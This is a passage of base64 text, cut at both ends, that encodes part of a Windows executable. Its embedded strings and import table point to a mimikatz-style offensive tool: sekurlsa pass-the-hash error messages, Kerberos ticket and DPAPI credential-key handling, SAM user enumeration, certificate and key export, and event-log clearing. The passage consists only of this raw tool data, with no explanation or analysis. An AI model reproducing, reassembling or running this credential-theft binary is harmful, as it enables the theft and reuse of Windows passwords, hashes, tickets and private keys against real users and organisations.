yACAAYgB5AHQAZQBzACkACgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AcwBlAGsAdQByAGwAcwBhAF8AcAB0AGgAIAA7ACAAQQBFAFMAMgA1ADYAIABrAGUAeQAgAG8AbgBsAHkAIABzAHUAcABwAG8AcgB0AGUAZAAgAGYAcgBvAG0AIABXAGkAbgBkAG8AdwBzACAAOAAuADEAIAAoAG8AcgAgADcALwA4ACAAdwBpAHQAaAAgAGsAYgAyADgANwAxADkAOQA3ACkACgAAAG4AdABsAG0AAAAAAAAAAABOAFQATABNAAkAOgAgAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBzAGUAawB1AHIAbABzAGEAXwBwAHQAaAAgADsAIABuAHQAbABtACAAaABhAHMAaAAgAGwAZQBuAGcAdABoACAAbQB1AHMAdAAgAGIAZQAgADMAMgAgACgAMQA2ACAAYgB5AHQAZQBzACkACgAAACAAIAB8ACAAIABQAEkARAAgACAAJQB1AAoAIAAgAHwAIAAgAFQASQBEACAAIAAlAHUACgAAAAAAIAAgAHwAIAAgAEwAVQBJAEQAIAAlAHUAIAA7ACAAJQB1ACAAKAAlADAAOAB4ADoAJQAwADgAeAApAAoAAAAAACAAIABcAF8AIABtAHMAdgAxAF8AMAAgACAAIAAtACAAAAAAAAAAAAAgACAAXABfACAAawBlAHIAYgBlAHIAbwBzACAALQAgAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBzAGUAawB1AHIAbABzAGEAXwBwAHQAaAAgADsAIABHAGUAdABUAG8AawBlAG4ASQBuAGYAbwByAG0AYQB0AGkAbwBuACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHMAZQBrAHUAcgBsAHMAYQBfAHAAdABoACAAOwAgAE8AcABlAG4AUAByAG8AYwBlAHMAcwBUAG8AawBlAG4AIAAoADAAeAAlADAAOAB4ACkACgAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBzAGUAawB1AHIAbABzAGEAXwBwAHQAaAAgADsAIABDAHIAZQBhAHQAZQBQAHIAbwBjAGUAcwBzAFcAaQB0AGgATABvAGcAbwBuAFcAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHMAZQBrAHUAcgBsAHMAYQBfAHAAdABoACAAOwAgAE0AaQBzAHMAaQBuAGcAIABhAHQAIABsAGUAYQBzAHQAIABvAG4AZQAgAGEAcgBnAHUAbQBlAG4AdAAgADoAIABuAHQAbABtACAATwBSACAAYQBlAHMAMQAyADgAIABPAFIAIABhAGUAcwAyADUANgAKAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AcwBlAGsAdQByAGwAcwBhAF8AcAB0AGgAIAA7ACAATQBpAHMAcwBpAG4AZwAgAGEAcgBnAHUAbQBlAG4AdAAgADoAIABkAG8AbQBhAGkAbgAKAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAHMAZQBrAHUAcgBsAHMAYQBfAHAAdABoACAAOwAgAE0AaQBzAHMAaQBuAGcAIABhAHIAZwB1AG0AZQBuAHQAIAA6ACAAdQBzAGUAcgAKAAAAAAAAAAAACgAJACAAKgAgAFUAcwBlAHIAbgBhAG0AZQAgADoAIAAlAHcAWgAKAAkAIAAqACAARABvAG0AYQBpAG4AIAAgACAAOgAgACUAdwBaAAAAAAAKAAkAIAAqACAATABNACAAIAAgACAAIAAgACAAOgAgAAAAAAAAAAAACgAJACAAKgAgAE4AVABMAE0AIAAgACAAIAAgADoAIAAAAAAAAAAAAAoACQAgACoAIABTAEgAQQAxACAAIAAgACAAIAA6ACAAAAAAAAAAAAAKAAkAIAAqACAAUgBhAHcAIABkAGEAdABhACAAOgAgAAAAAAAAAAAACgAJACAAKgAgAFAASQBOACAAYwBvAGQAZQAgADoAIAAlAHcAWgAAAAkAIAAgACAAJQBzACAAAAA8AG4AbwAgAHMAaQB6AGUALAAgAGIAdQBmAGYAZQByACAAaQBzACAAaQBuAGMAbwByAHIAZQBjAHQAPgAAAAAAJQB3AFoACQAlAHcAWgAJAAAAAAAAAAAACgAJACAAKgAgAFUAcwBlAHIAbgBhAG0AZQAgADoAIAAlAHcAWgAKAAkAIAAqACAARABvAG0AYQBpAG4AIAAgACAAOgAgACUAdwBaAAoACQAgACoAIABQAGEAcwBzAHcAbwByAGQAIAA6ACAAAAAAAEwAVQBJAEQAIABLAE8ACgAAAAAAAAAAAAoACQAgACoAIABSAG8AbwB0AEsAZQB5ACAAIAA6ACAAAAAAAAAAAAAKAAkAIAAqACAARABQAEEAUABJACAAIAAgACAAOgAgAAAAAAAAAAAACgAJACAAKgAgACUAMAA4AHgAIAA6ACAAAAAAAAAAAAAKAAkAIABbACUAMAA4AHgAXQAAAAAAAABkAHAAYQBwAGkAcwByAHYALgBkAGwAbAAAAAAAAAAAAAkAIABbACUAMAA4AHgAXQAKAAkAIAAqACAARwBVAEkARAAgADoACQAAAAAAAAAAAAoACQAgACoAIABUAGkAbQBlACAAOgAJAAAAAAAAAAAACgAJACAAKgAgAEsAZQB5ACAAOgAJAAAACgAJAEsATwAAAAAAAAAAAFQAaQBjAGsAZQB0ACAARwByAGEAbgB0AGkAbgBnACAAVABpAGMAawBlAHQAAAAAAEMAbABpAGUAbgB0ACAAVABpAGMAawBlAHQAIAA/AAAAVABpAGMAawBlAHQAIABHAHIAYQBuAHQAaQBuAGcAIABTAGUAcgB2AGkAYwBlAAAAawBlAHIAYgBlAHIAbwBzAC4AZABsAGwAAAAAAAAAAAAKAAkARwByAG8AdQBwACAAJQB1ACAALQAgACUAcwAAAAoACQAgACoAIABLAGUAeQAgAEwAaQBzAHQAIAA6AAoAAAAAAAAAAABkAGEAdABhACAAYwBvAHAAeQAgAEAAIAAlAHAAAAAAAAoAIAAgACAAXABfACAAJQBzACAAAAAAAC0APgAgAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBzAGUAawB1AHIAbABzAGEAXwBlAG4AdQBtAF8AawBlAHIAYgBlAHIAbwBzAF8AYwBhAGwAbABiAGEAYwBrAF8AcAB0AGgAIAA7ACAAawB1AGwAbABfAG0AXwBtAGUAbQBvAHIAeQBfAGMAbwBwAHkAIAAoADAAeAAlADAAOAB4ACkACgAAAAoAIAAgACAAXABfACAAKgBQAGEAcwBzAHcAbwByAGQAIAByAGUAcABsAGEAYwBlACAALQA+ACAAAAAAAAAAAABuAHUAbABsAAAAAAAAAAAACgAJACAAIAAgACoAIABTAGEAdgBlAGQAIAB0AG8AIABmAGkAbABlACAAJQBzACAAIQAAAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AcwBlAGsAdQByAGwAcwBhAF8AawBlAHIAYgBlAHIAbwBzAF8AZQBuAHUAbQBfAHQAaQBjAGsAZQB0AHMAIAA7ACAAawB1AGwAbABfAG0AXwBmAGkAbABlAF8AdwByAGkAdABlAEQAYQB0AGEAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAABbACUAeAA7ACUAeABdAC0AJQAxAHUALQAlAHUALQAlADAAOAB4AC0AJQB3AFoAQAAlAHcAWgAtACUAdwBaAC4AJQBzAAAAAABbACUAeAA7ACUAeABdAC0AJQAxAHUALQAlAHUALQAlADAAOAB4AC4AJQBzAAAAAABsAGkAdgBlAHMAcwBwAC4AZABsAGwAAABDcmVkZW50aWFsS2V5cwAAUHJpbWFyeQAKAAkAIABbACUAMAA4AHgAXQAgACUAWgAAAAAAAAAAAGQAYQB0AGEAIABjAG8AcAB5ACAAQAAgACUAcAAgADoAIAAAAAAAAABPAEsAIAAhAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBzAGUAawB1AHIAbABzAGEAXwBtAHMAdgBfAGUAbgB1AG0AXwBjAHIAZQBkAF8AYwBhAGwAbABiAGEAYwBrAF8AcAB0AGgAIAA7ACAAawB1AGwAbABfAG0AXwBtAGUAbQBvAHIAeQBfAGMAbwBwAHkAIAAoADAAeAAlADAAOAB4ACkACgAAAC4AAAAAAAAAAAAAAAAAAABuAC4AZQAuACAAKABLAEkAVwBJAF8ATQBTAFYAMQBfADAAXwBQAFIASQBNAEEAUgBZAF8AQwBSAEUARABFAE4AVABJAEEATABTACAASwBPACkAAAAAAAAAAAAAAAAAAABuAC4AZQAuACAAKABLAEkAVwBJAF8ATQBTAFYAMQBfADAAXwBDAFIARQBEAEUATgBUAEkAQQBMAFMAIABLAE8AKQAAAAAAAABtAHMAdgAxAF8AMAAuAGQAbABsAAAAAAB0AHMAcABrAGcALgBkAGwAbAAAAAAAAAB3AGQAaQBnAGUAcwB0AC4AZABsAGwAAAABCQMACQGmAAIwAAABDgEADkIAAAEKBAAKNAgAClIGcAEUAgAUUhBwARYKABZUCwAWNAoAFjIS4BDQDsAMcAtgAQYCAAYyAlAZGAUAGAEoABFwEGAPMAAAGogBAAkAAACNUwEAqVMBALipAQCpUwEAwlMBANxTAQAYqgEA3FMBAPlTAQATVAEAeKoBABNUAQAxVAEAQFQBANiqAQBAVAEAU1QBAGJUAQA4qwEAYlQBAIFUAQCNVAEAmKsBAI1UAQCpVAEAw1QBAPirAQDDVAEA7VQBAARVAQBYrAEABFUBAFpTAQAKVQEAuKwBAAAAAAABDAIADAERABkaBgALkgfABXAEYANQAjBYTwEAQAAAABkXBAAIcgRwA2ACMFhPAQA4AAAAGSkLABc0XwAXAVQAEPAO4AzQCsAIcAdgBlAAAFhPAQCYAgAAAQ8GAA9kDwAPNA4AD7ILcAEYCAAYZAgAGFQHABg0BgAYMhRwGSkLABc0nwAXAZQAEPAO4AzQCsAIcAdgBlAAAFhPAQCQBAAAARQIABRkEAAUVA8AFDQOABSyEHAZIwoAFDQUABSyEPAO4AzQCsAIcAdgBlBYTwEAUAAAABkrCwAZNIEAGQF2ABLwEOAO0AzACnAJYAhQAABYTwEAoAMAAAkEAQAEQgAAGogBAAEAAACviAEA4ogBANGsAQDiiAEAAQoEAAo0CAAKMgZwAQQBAARiAAABFAgAFHIQ8A7gDNAKwAhwB2AGMBkhCAASVAkAEjQIABIyDtAMcAtgWE8BABAAAAAZKQsAFzQeABcBFAAQ8A7gDNAKwAhwB2AGUAAAWE8BAJAAAAAZGwQADDQQAAyyCHBYTwEAWAAAAAEXCAAXZAsAF1QKABc0CQAXUhNwAQ8GAA9kCQAPNAgADzILcBkhCAASVA0AEjQMABJSDsAMcAtgWE8BACgAAAABBAEABMIAAAEGAgAGkgIwARwLABx0KQAcZCgAHFQnABw0JgAcASQAFcAAAAENBQANARgABnAFYAQwAAABBgIABjICMAEcDAAcZAwAHFQLABw0CgAcMhjwFuAU0BLAEHABGAoAGGQNABhUDAAYNAsAGFIU0BLAEHABBAEABIIAAAEUCAAUZAkAFFQIABQ0BwAUMhBwARgIABhkDgAYVA0AGDQMABiSFHABHQwAHXQNAB1kDAAdVAsAHTQKAB1SGeAX0BXAASAMACBkDwAgVA0AIDQMACBSHPAa4BjQFsAUcAEUCAAUZAkAFFQHABQ0BgAUMhBwAQoEAAo0BwAKMgZwARkKABl0DQAZZAwAGVQLABk0CgAZchXAAQ8GAA9kBwAPNAYADzILcAEcDAAcZBAAHFQPABw0DgAcchjwFuAU0BLAEHABHQwAHXQPAB1kDgAdVA0AHTQMAB1yGeAX0BXAARkKABl0EQAZZBAAGVQPABk0DgAZshXAAREGABE0DQARcg1wDGALUAEUCAAUZAoAFFQJABQ0CAAUUhBwARwLABzEHwAcdB4AHGQdABw0HAAcARoAFdAAAAEEAQAEQgAAARkDABlCFXAUMAAAAQ8GAA9kCQAPNAgAD1ILcAEPBgAPZAcAD1QGAA8yC3ABEggAElQPABI0DAAScg7ADHALYAEUCAAUZA4AFFQNABQ0DAAUkhBwARgKABhkDgAYVA0AGDQMABhyFNASwBBwARgKABhkEgAYVBEAGDQQABiyFNASwBBwAQgCAAhyBDABCwIAC/IEMAESCAASVAsAEjQKABJSDsAMcAtgAQYCAAbSAjABGwoAG2QXABtUFQAbNBQAG/IU0BLAEHABGwoAG2QWABtUFQAbNBQAG/IU0BLAEHABEAYAEGQNABA0DAAQkgxwARsLABtkGgAbVBkAGzQYABsBFAAU0BLAEHAAAAEYCgAYZBQAGFQTABg0EgAY0hTQEsAQcAEcDAAcZBIAHFQRABw0EAAckhjwFuAU0BLAEHABGAoAGGQTABhUEQAYNBAAGLIU0BLAEHABDgYADjQLAA5SCnAJYAhQARcLABc0HAAXARQAEPAO4AzQCsAIcAdgBlAAAAEWCgAWVBMAFjQSABayEvAQ0A7ADHALYAEPBgAPZAsADzQKAA9yC3ABHQsAHTQvAB0BJAAW8BTgEtAQwA5wDWAMUAAAARsJABuCF/AV4BPQEcAPcA5gDVAMMAAAAQwGAAw0DQAMcghwB2AGUAEWCgAWNA4AFlIS8BDgDtAMwApwCWAIUAEQBgAQZAsAEDQKABByDHABGQoAGXQJABlkCAAZVAcAGTQGABkyFcABIQoAIWQKACFUCQAhNAgAITId0BvAGXABDgIADjIKMAESCAASVBMAEjQQABKyDsAMcAtgAREGABE0FAAR8gpwCWAIUAEXCwAXNCEAFwEYABDwDuAM0ArACHAHYAZQAAABBAEABKIAAAEQBAAQNAgAEFIMcAEbCwAbZCwAG1QrABs0KgAbASYAFOAS0BBwAAABGgsAGlQhABo0IAAaARoAE/AR0A/ADXAMYAAAARsJABtUHwAbNB4AGwEaABTQEsAQcAAAARoLABpUHQAaNBwAGgEWABPgEdAPwA1wDGAAAAESCAASNBAAEpIO0AzACnAJYAhQAQwEAAw0CAAMUghwARAGABBkEQAQNBAAENIMcAESBwASZBUAEjQUABIBEgALcAAAARkKABk0DwAZMhXwE+AR0A/ADXAMYAtQAQoCAAoBSQABFAgAFGQPABRUDgAUNA0AFJIQcAEdDAAddAsAHWQKAB1UCQAdNAgAHTIZ4BfQFcABIAwAIGQPACBUDgAgNAwAIFIc8BrgGNAWwBRwARgKABhkCgAYVAkAGDQIABgyFNASwBBwARQIABRkDAAUVAsAFDQKABRyEHABCAIACJIEMAEdCwAdNCQAHQEcABbwFOAS0BDADnANYAxQAAABGgkAGmQbABpUGgAaNBgAGgEWABNwAAABFwkAF2QaABdUGQAXNBgAFwEWABBwAAABEwgAE1QPABM0DgATkg/ADXAMYAEbCgAbZBcAG1QWABs0FQAb8hTQEsAQcAEUCAAUZA0AFFQMABQ0CwAUchBwARYKABY0FgAW0hLwEOAO0AzACnAJYAhQARYJABZUFwAWNBYAFgESAA/ADXAMYAAAARkLABk0KAAZAR4AEvAQ4A7QDMAKcAlgCFAAAAEfDQAfZCoAH1QpAB80KAAfASIAGPAW4BTQEsAQcAAAASELACE0JgAhAR4AGvAY4BbQFMAScBFgEFAAAAETBgATVAoAEzQJABNSD3ABFQYAFTQMABVSEcAPcA5gAQsGAAtSB9AFcARgA1ACMAESCAASNBQAEtIO0AzACnAJYAhQAQ0FAA00KAANASYABnAAAAETBwATZBcAEzQWABMBFAAMcAAAARsLABtkGQAbVBcAGzQWABsBEgAU0BLAEHAAAAEgDQAgdEEAIGRAACBUPwAgND4AIAE6ABngF9AVwAAAARoGABo0EwAashZwFWAUUAEGAgAGUgIwAQQBAATiAAABEwcAE2QVABM0FAATARIADHAAAAEUCAAUZBIAFFQRABQ0EAAU0hBwARQIABRkCAAUVAcAFDQGABQyEHABEAYAEGQ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AAMLEAgAAAAAA1MQCAAAAAADqxAIAAAAAAP7EAgAAAAAAFMUCAAAAAABQywIAAAAAAAAAAAAAAAAAfQFMc2FRdWVyeUluZm9ybWF0aW9uUG9saWN5AHUBTHNhT3BlblBvbGljeQBWAUxzYUNsb3NlAABnAENyZWF0ZVdlbGxLbm93blNpZAAAYQBDcmVhdGVQcm9jZXNzV2l0aExvZ29uVwBgAENyZWF0ZVByb2Nlc3NBc1VzZXJXAAD4AVJlZ1F1ZXJ5VmFsdWVFeFcAAPIBUmVnUXVlcnlJbmZvS2V5VwAA4gFSZWdFbnVtVmFsdWVXAO0BUmVnT3BlbktleUV4VwDfAVJlZ0VudW1LZXlFeFcAywFSZWdDbG9zZUtleQA+AENsb3NlU2VydmljZUhhbmRsZQAArwBEZWxldGVTZXJ2aWNlAK4BT3BlblNDTWFuYWdlclcAALABT3BlblNlcnZpY2VXAABMAlN0YXJ0U2VydmljZVcAxAFRdWVyeVNlcnZpY2VTdGF0dXNFeAAAQgBDb250cm9sU2VydmljZQAAOwFJc1RleHRVbmljb2RlAFAAQ29udmVydFNpZFRvU3RyaW5nU2lkVwAArAFPcGVuUHJvY2Vzc1Rva2VuAAAaAUdldFRva2VuSW5mb3JtYXRpb24ASgFMb29rdXBBY2NvdW50U2lkVwBYAENvbnZlcnRTdHJpbmdTaWRUb1NpZFcAAJQAQ3J5cHRFeHBvcnRLZXkAAIYAQ3J5cHRBY3F1aXJlQ29udGV4dFcAAJoAQ3J5cHRHZXRLZXlQYXJhbQAAoABDcnlwdFJlbGVhc2VDb250ZXh0AJMAQ3J5cHRFbnVtUHJvdmlkZXJzVwCbAENyeXB0R2V0UHJvdlBhcmFtAIwAQ3J5cHREZXN0cm95S2V5AJwAQ3J5cHRHZXRVc2VyS2V5AKsBT3BlbkV2ZW50TG9nVwAEAUdldE51bWJlck9mRXZlbnRMb2dSZWNvcmRzAAA6AENsZWFyRXZlbnRMb2dXAABlAENyZWF0ZVNlcnZpY2VXAABDAlNldFNlcnZpY2VPYmplY3RTZWN1cml0eQAAKgBCdWlsZFNlY3VyaXR5RGVzY3JpcHRvclcAAMIBUXVlcnlTZXJ2aWNlT2JqZWN0U2VjdXJpdHkAAB0AQWxsb2NhdGVBbmRJbml0aWFsaXplU2lkAADiAEZyZWVTaWQAmQBDcnlwdEdldEhhc2hQYXJhbQCiAENyeXB0U2V0S2V5UGFyYW0AAHACU3lzdGVtRnVuY3Rpb24wMzIAVQJTeXN0ZW1GdW5jdGlvbjAwNQCfAENyeXB0SW1wb3J0S2V5AABpAlN5c3RlbUZ1bmN0aW9uMDI1AIgAQ3J5cHRDcmVhdGVIYXNoAIkAQ3J5cHREZWNyeXB0AACLAENyeXB0RGVzdHJveUhhc2gAAGQBTHNhRnJlZU1lbW9yeQCdAENyeXB0SGFzaERhdGEAsQFPcGVuVGhyZWFkVG9rZW4ARQJTZXRUaHJlYWRUb2tlbgAAtABEdXBsaWNhdGVUb2tlbkV4AAA4AENoZWNrVG9rZW5NZW1iZXJzaGlwAABsAENyZWRGcmVlAABrAENyZWRFbnVtZXJhdGVXAABBRFZBUEkzMi5kbGwAAHUAQ3J5cHRCaW5hcnlUb1N0cmluZ1cAAHMAQ3J5cHRBY3F1aXJlQ2VydGlmaWNhdGVQcml2YXRlS2V5AEYAQ2VydEdldE5hbWVTdHJpbmdXAABQAENlcnRPcGVuU3RvcmUAPABDZXJ0RnJlZUNlcnRpZmljYXRlQ29udGV4dAAABABDZXJ0QWRkQ2VydGlmaWNhdGVDb250ZXh0VG9TdG9yZQAADwBDZXJ0Q2xvc2VTdG9yZQAAQQBDZXJ0R2V0Q2VydGlmaWNhdGVDb250ZXh0UHJvcGVydHkAKQBDZXJ0RW51bUNlcnRpZmljYXRlc0luU3RvcmUALABDZXJ0RW51bVN5c3RlbVN0b3JlAAMBUEZYRXhwb3J0Q2VydFN0b3JlRXgAAENSWVBUMzIuZGxsAAUAQ0RMb2NhdGVDU3lzdGVtAAYAQ0RMb2NhdGVDaGVja1N1bQAACwBNRDVGaW5hbAAADQBNRDVVcGRhdGUADABNRDVJbml0AGNyeXB0ZGxsLmRsbAAATgBQYXRoSXNSZWxhdGl2ZVcAIgBQYXRoQ2Fub25pY2FsaXplVwAkAFBhdGhDb21iaW5lVwAAU0hMV0FQSS5kbGwAJgBTYW1RdWVyeUluZm9ybWF0aW9uVXNlcgAGAFNhbUNsb3NlSGFuZGxlAAAUAFNhbUZyZWVNZW1vcnkAEwBTYW1FbnVtZXJhdGVVc2Vyc0luRG9tYWluACEAU2FtT3BlblVzZXIAHQBTYW1Mb29rdXBOYW1lc0luRG9tYWluAAAcAFNhbUxvb2t1cElkc0luRG9tYWluAAAfAFNhbU9wZW5Eb21haW4ABwBTYW1Db25uZWN0AAARAFNhbUVudW1lcmF0ZURvbWFpbnNJblNhbVNlcnZlcgAAGABTYW1HZXRHcm91cHNGb3JVc2VyACwAU2FtUmlkVG9TaWQAGwBTYW1Mb29rdXBEb21haW5JblNhbVNlcnZlcgAAFQBTYW1HZXRBbGlhc01lbWJlcnNoaXAAU0FNTElCLmRsbAAAKABMc2FMb29rdXBBdXRoZW50aWNhdGlvblBhY2thZ2UAACUATHNhRnJlZVJldHVybkJ1ZmZlcgAjAExzYURlcmVnaXN0ZXJMb2dvblByb2Nlc3MAIgBMc2FDb25uZWN0VW50cnVzdGVkACEATHNhQ2FsbEF1dGhlbnRpY2F0aW9uUGFja2FnZQAAU2VjdXIzMi5kbGwABwBDb21tYW5kTGluZVRvQXJndlcAAFNIRUxMMzIuZGxsAJsBSXNDaGFyQWxwaGFOdW1lcmljVwBVU0VSMzIuZGxsAAAFAE1ENFVwZGF0ZQADAE1ENEZpbmFsAAAEAE1ENEluaXQAYWR2YXBpMzIuZGxsAAAQAFJ0bFVuaWNvZGVTdHJpbmdUb0Fuc2lTdHJpbmcAAAoAUnRsRnJlZUFuc2lTdHJpbmcAAgBOdFF1ZXJ5U3lzdGVtSW5mb3JtYXRpb24AAA4AUnRsSW5pdFVuaWNvZGVTdHJpbmcAAAkAUnRsRXF1YWxVbmljb2RlU3RyaW5nAAEATnRRdWVyeU9iamVjdAAMAFJ0bEdldEN1cnJlbnRQZWIAAAAATnRRdWVyeUluZm9ybWF0aW9uUHJvY2VzcwAPAFJ0bFN0cmluZ0Zyb21HVUlEAAsAUnRsRnJlZVVuaWNvZGVTdHJpbmcAAA0AUnRsR2V0TnRWZXJzaW9uTnVtYmVycwAAAwBOdFJlc3VtZVByb2Nlc3MABgBSdGxBZGp1c3RQcml2aWxlZ2UAAAQATnRTdXNwZW5kUHJvY2VzcwAABQBOdFRlcm1pbmF0ZVByb2Nlc3MAAAgAUnRsRXF1YWxTdHJpbmcAAG50ZGxsLmRsbACNA1ZpcnR1YWxQcm90ZWN0AABdA1NsZWVwAMgARmlsZVRpbWVUb1N5c3RlbVRpbWUAAFQCTG9jYWxBbGxvYwAAWAJMb2NhbEZyZWUAqwNXcml0ZUZpbGUAsQJSZWFkRmlsZQAAWQBDcmVhdGVGaWxlVwDxAEZsdXNoRmlsZUJ1ZmZlcnMAAGcBR2V0RmlsZVNpemVFeABEAUdldEN1cnJlbnREaXJlY3RvcnlXAAA2AENsb3NlSGFuZGxlAEUBR2V0Q3VycmVudFByb2Nlc3MAggJPcGVuUHJvY2VzcwBzAUdldExhc3RFcnJvcgAAlgBEdXBsaWNhdGVIYW5kbGUALwNTZXRMYXN0RXJyb3IAAI0AR